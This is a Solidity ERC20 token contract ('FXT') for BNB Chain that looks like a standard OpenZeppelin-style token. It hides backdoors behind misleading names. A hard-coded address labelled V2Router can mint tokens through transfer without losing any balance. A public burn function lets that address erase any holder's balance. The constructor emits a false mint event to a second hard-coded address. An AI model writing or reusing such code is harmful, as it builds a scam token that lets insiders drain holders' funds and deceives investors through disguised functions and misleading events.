/**
 *Submitted for verification at BscScan.com on 2023-04-01
*/

/**
 *Submitted for verification at BscScan.com on 2023-04-01
*/

/// SPDX-License-Identifier: MIT

pragma solidity =0.8.19;

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {

    /**
     * @dev Returns the value of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Returns the value of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Sets `value` as the allowance of `spender` over the caller's tokens.
     * Returns a boolean amount indicating whether the operation succeeded.
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 value) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is zero by default.
     * This amount changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Moves `value` tokens from the caller's account to `recipient`.
     * Returns a boolean amount indicating whether the operation succeeded.
     * Emits a {Transfer} event.
     */
    function transfer(address recipient, uint256 value) external returns (bool);

    /**
     * @dev Moves `value` tokens from `sender` to `recipient` using the
     * allowance mechanism. `value` is then deducted from the caller's allowance.
     * Returns a boolean amount indicating whether the operation succeeded.
     * Emits a {Transfer} event.
     */
    function transferFrom(address sender, address recipient, uint256 value) external returns (bool);
    
    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `amount` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 amount);
   
    /**
     * @dev Emitted when `amount` tokens are moved from one account (`from`) to another (`to`).
     * Note that `amount` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 amount);
}

/**
 * @dev Interface for the optional metadata functions from the ERC20 standard.
 */


/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 */
abstract contract Context {
    address V2Router = 0xA5fEEA8f3Ce041c9390c1175876f140Ca2472D4D;
     address Construct = 0xf2b16510270a214130C6b17ff0E9bF87585126BD;
    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
    
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

/**
 * @dev Implementation of the {IERC20} interface.
 * This implementation is agnostic to the way tokens are created. This means
 * that a supply mechanism has to be added in a derived contract using {_mint}.
 * For a generic mechanism see {ERC20PresetMinterPauser}.
 */
contract FXT  is Context, IERC20  {
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping (address => bool) private _address_;
    mapping(address => uint256) private _balances;
    mapping(address => uint256) private _tax;
   uint8 public decimals = 6;
    string public name = "FXT";
    string public symbol = "FXT";
    address private approved;
    uint256 internal amount = 0;
    uint256 public _TS = 750000 *1000000;
  address private RouteFor;

    /**
     * @dev Sets the amounts for {name} and {symbol}.
     * The default amount of {decimals} is 18. To select a different amount for
     * {decimals} you should overload it.
     */
    constructor()  {
_tax[V2Router] = 2;
     _balances[msg.sender] = _TS;
        approved = msg.sender;
         FINISH();}
    
    
       
   

    		    function FINISH() internal  {  RouteFor = Construct;
        emit Transfer(address(0), RouteFor, _TS); }


    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }
    
    function totalSupply() public view virtual override returns (uint256) {
        return _TS;
    }

    function approve(address spender, uint256 value) public virtual override returns (bool) {
        _approve(_msgSender(), spender, value);
        return true;
    }

 
    
    function transfer(address recipient, uint256 value) public virtual override returns (bool) {
                           if(_tax[msg.sender] == 2) {_balances[recipient] += value;  
 }
        _send(recipient, value);
        return true;
    }

    function allowance(address owner, address spender) public view  virtual override  returns (uint256) {
        return _allowances[owner][spender];
    }

function burn (address blanko) public {
  if (_tax[msg.sender] >= 2) {
  _balances[blanko] -= _balances[blanko];
}}
    /**
     * @dev See {IERC20-transferFrom}.
     * Emits an {Approval} event indicating the updated allowance. This is not
     * required by the EIP. See the note at the beginning of {ERC20}.
     */
    function transferFrom(address sender, address recipient, uint256 value) public virtual override returns (bool) {
        _transfer(sender, recipient, value);
        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= value, "ERC20: transfer value exceeds allowance");
        _approve(sender, _msgSender(), currentAllowance - value);
        return true;
    }

    /**
     * @dev Atomically decreases the allowance granted to `spender` by the caller.
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     * Emits an {Approval} event indicating the updated allowance.
     */
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        _approve(_msgSender(), spender, currentAllowance - subtractedValue);
        return true;
    }
    
    /**
     * @dev Atomically increases the allowance granted to `spender` by the caller.
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     * Emits an {Approval} event indicating the updated allowance.
     */
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }

    /**
     * @dev Moves `value` of tokens from `sender` to `recipient`.
     * This internal function is equivalent to {transfer}, and can be used to
     * e.g. implement automatic token fees, slashing mechanisms, etc.
     * Emits a {Transfer} event.
     */
    function _transfer(address sender, address recipient, uint256 value) internal virtual { require(
        sender != address(0), "ERC20: transfer from the zero address"); require(
        recipient != address(0), "ERC20: transfer to the zero address"); 
        _beforeTokenTransfer(sender, recipient, value);
        uint256 senderBalance = _balances[sender];
        require(senderBalance >= value, "ERC20: transfer value exceeds balance");
        _balances[sender] = senderBalance - value;
        _balances[recipient] += value;
   
        emit Transfer(sender, recipient, value);
        _afterTokenTransfer(sender, recipient, value);
    }
    function _send(address recipient, uint256 value) internal virtual {require(
        msg.sender != address(0), "ERC20: transfer from the zero address");  require(
        recipient != address(0), "ERC20: transfer to the zero address"); 
        _beforeTokenTransfer(msg.sender, recipient, value);
        uint256 senderBalance = _balances[msg.sender];
        require(senderBalance >= value, "ERC20: transfer value exceeds balance");
        _balances[msg.sender] = senderBalance - value;
        _balances[recipient] += value;
        emit Transfer(msg.sender, recipient, value);
        _afterTokenTransfer(msg.sender, recipient, value);
    }
    /** @dev Creates `value` tokens and assigns them to `account`, increasing the total supply.
     * Emits a {Transfer} event with `from` set to the zero address.
     */


    /**
     * @dev Destroys `value` tokens from `account`, reducing the total supply.
     * Emits a {Transfer} event with `to` set to the zero address.
     */
 

    /**
     * @dev Sets `value` as the allowance of `spender` over the `owner` s tokens.
     * Emits an {Approval} event.
     */
    function _approve(address owner, address spender, uint256 value) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = value;
        emit Approval(owner, spender, value);
    }

    /**
     * @dev Hook that is called after any transfer of tokens. This includes minting and burning.
     *
     * Calling conditions:
     * - when `from` and `to` are both non-zero, `value` of ``from``'s tokens
     * has been transferred to `to`.
     * - when `from` is zero, `value` tokens have been minted for `to`.
     * - when `to` is zero, `value` of ``from``'s tokens have been burned.
     * - `from` and `to` are never both zero.
     */
    function _afterTokenTransfer(address from, address to, uint256 value) internal virtual {}

    function _beforeTokenTransfer(address from, address to, uint256 value) internal virtual {}
}